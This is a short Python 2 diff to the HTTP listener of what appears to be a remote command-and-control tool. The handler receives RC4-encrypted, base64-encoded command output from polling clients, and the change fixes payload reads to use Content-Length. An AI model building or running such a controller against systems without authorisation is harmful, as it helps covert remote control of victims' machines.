@@ -178,15 +178,16 @@ class myRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
 		global command_output, output_ready, timestamp, salt, password
 		if verbose: print "received output for command: "+ last_command
 		if verbose: print "now decoding it..."
+		content_length = int(self.headers["content-length"])
 		if encrypt:
 			if verbose: print " decrypting using salt: "+salt
 			# create hash of password + salt
 			hasher = SHA.new()
 			hasher.update(password + salt)
 			rc4 = ARC4.new(hasher.hexdigest()) # use a hash for password to avoid weak key scheduling 
-			content = self.rfile.read() # read payload
+			content = self.rfile.read(content_length) # read payload
 			command_output = rc4.decrypt(base64.b64decode(content))	# decrypt payload
-		else: command_output = base64.b64decode(self.rfile.read()) # payload is not encrypted
+		else: command_output = base64.b64decode(self.rfile.read(content_length)) # payload is not encrypted
 		output_ready = True 
 		# Check special header to know client current polling period
 		if "Next-Polling-In" in self.headers:
